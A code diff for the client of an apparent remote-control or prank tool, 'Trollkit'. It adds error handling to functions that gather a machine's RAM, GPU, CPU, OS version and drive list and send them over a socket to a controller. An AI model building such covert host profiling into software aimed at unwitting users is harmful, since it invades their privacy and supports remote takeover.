@@ -63,44 +63,57 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			string ramString = GetRamAmount();
 			TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
-
 		}
 		
 		private string GetRamAmount()
 		{
-			ulong l;
-			GetPhysicallyInstalledSystemMemory(out l);
-			return (l / 1024) + "Mb RAM";
+			try
+			{
+				ulong l;
+				GetPhysicallyInstalledSystemMemory(out l);
+				return ((l / 1024) / 1024) + " GB RAM";
+			}
+			catch (Exception e)
+			{
+				BConsole.WriteLine("RAM Error: " + e.Message, ConsoleColor.Red);
+				return "";
+			}
 		}
 
 		private string GetGPUName()
 		{
-			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\VIDEO", false);
-			if (key != null)
+			try
 			{
-				string notfound = "NotFound";
-				string videoDriverLocation = key.GetValue(@"\Device\Video0", notfound).ToString();
-
-				if (videoDriverLocation != notfound)
+				RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\VIDEO", false);
+				if (key != null)
 				{
-					string[] splitInfo = videoDriverLocation.Replace(@"\", "|").Split('|');
+					string notfound = "NotFound";
+					string videoDriverLocation = key.GetValue(@"\Device\Video0", notfound).ToString();
 
-					string path = $@"SYSTEM\CurrentControlSet\Control\Video\{splitInfo[splitInfo.Length - 2]}\{splitInfo[splitInfo.Length -1]}";
-
-					RegistryKey key2 = Registry.LocalMachine.OpenSubKey(path, false);
-					if (key2 != null)
+					if (videoDriverLocation != notfound)
 					{
-						string driverDescription = key2.GetValue(@"DriverDesc", notfound).ToString();
-						if (driverDescription != notfound)
+						string[] splitInfo = videoDriverLocation.Replace(@"\", "|").Split('|');
+
+						string path = $@"SYSTEM\CurrentControlSet\Control\Video\{splitInfo[splitInfo.Length - 2]}\{splitInfo[splitInfo.Length - 1]}";
+
+						RegistryKey key2 = Registry.LocalMachine.OpenSubKey(path, false);
+						if (key2 != null)
 						{
-							return driverDescription;
+							string driverDescription = key2.GetValue(@"DriverDesc", notfound).ToString();
+							if (driverDescription != notfound)
+							{
+								return driverDescription;
+							}
+							else
+								return "Unkown GPU";
 						}
-						else
-							return "Unkown GPU";
 					}
 				}
 			}
-
+			catch (Exception e)
+			{
+				BConsole.WriteLine("GPU Error: " + e.Message, ConsoleColor.Red);
+			}
 			return "Unknown GPU";
 		}
 
@@ -108,11 +121,18 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private string GetCPUName()
 		{
-			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
-			if (key != null)
+			try
 			{
-				string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
-				return processor;
+				RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
+				if (key != null)
+				{
+					string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
+					return processor;
+				}
+			}
+			catch (Exception e)
+			{
+				BConsole.WriteLine("CPU Error: " + e.Message, ConsoleColor.Red);
 			}
 
 			return "Unknown Processor";
@@ -120,15 +140,33 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private string GetOSVersion()
 		{
-			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
-			if (key != null)
+			RegistryKey key;
+
+			try
 			{
-				string releaseId = key.GetValue("ReleaseId", "").ToString();
-				string productName = key.GetValue("ProductName", "Unknown OS").ToString();
+				if (!Environment.Is64BitOperatingSystem)
+				{
+					key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
+				}
+				else
+				{
+					RegistryKey localKey = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
+					key = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
+				}
 
-				string bit = Environment.Is64BitOperatingSystem ? "x64" : "x86";
+				if (key != null)
+				{
+					string releaseId = key.GetValue("ReleaseId", "").ToString();
+					string productName = key.GetValue("ProductName", "Unknown OS").ToString();
 
-				return $"{productName} [{releaseId}] ({bit})";
+					string bit = Environment.Is64BitOperatingSystem ? "x64" : "x86";
+
+					return $"{productName} [{releaseId}] ({bit})";
+				}
+			}
+			catch (Exception e)
+			{
+				BConsole.WriteLine("OS Error: " + e.Message, ConsoleColor.Red);
 			}
 
 			return "Unknown OS Version";
@@ -136,16 +174,24 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private string GetSystemDrives()
 		{
-			string returnString = "Available Drives: ";
-			var drives = DriveInfo.GetDrives();
-			foreach (DriveInfo info in drives)
+			try
 			{
-				if (info.IsReady)
+				string returnString = "Available Drives: ";
+				var drives = DriveInfo.GetDrives();
+				foreach (DriveInfo info in drives)
 				{
-					returnString += $"({info.Name.Replace("\\", "")}) ";
+					if (info.IsReady)
+					{
+						returnString += $"({info.Name.Replace("\\", "")}) ";
+					}
 				}
+				return returnString;
 			}
-			return returnString;
+			catch (Exception e)
+			{
+				BConsole.WriteLine("Drives error: " + e.Message, ConsoleColor.Red);
+				return "";
+			}
 		}
 	}
 }
